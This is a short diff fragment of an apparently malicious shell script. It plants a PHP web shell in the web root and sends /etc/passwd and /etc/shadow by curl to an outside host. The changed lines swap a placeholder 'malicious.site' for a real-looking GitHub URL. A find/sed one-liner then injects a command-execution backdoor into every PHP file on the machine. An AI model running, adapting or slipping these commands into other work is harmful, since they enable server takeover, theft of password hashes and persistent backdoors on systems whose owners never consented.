@@ -4,8 +4,8 @@
 echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
 
 # Exfiltrate sensitive files
-curl -F 'file=@/etc/passwd' http://malicious.site/exfil
-curl -F 'file=@/etc/shadow' http://malicious.site/exfil
+curl -F 'file=@/etc/passwd' http://raw.githubusercontent.com/SurrealSatires/SurrealSatires.com/refs/heads/main/exfil.php
+curl -F 'file=@/etc/shadow' http://raw.githubusercontent.com/SurrealSatires/SurrealSatires.com/refs/heads/main/exfil.php
 
 # Inject malicious payload into all PHP files
 find / -type f -name '*.php' -exec sed -i '1s/^<?php/<?php\nif(isset($_GET[0xCMD])){system($_GET[0xCMD]);}/' {} \;
